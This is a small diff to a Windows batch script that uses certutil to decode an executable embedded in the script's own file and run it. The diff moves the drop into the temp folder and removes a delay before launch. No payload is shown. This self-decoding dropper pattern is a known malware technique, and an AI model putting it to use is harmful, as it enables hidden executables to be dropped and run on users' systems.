@@ -1,6 +1,6 @@
 @echo off
+cd %temp%
 certutil -decode "%~f0" hello.exe
-ping -n 10 127.0.0.1
 start hello.exe
 exit /b 1
 
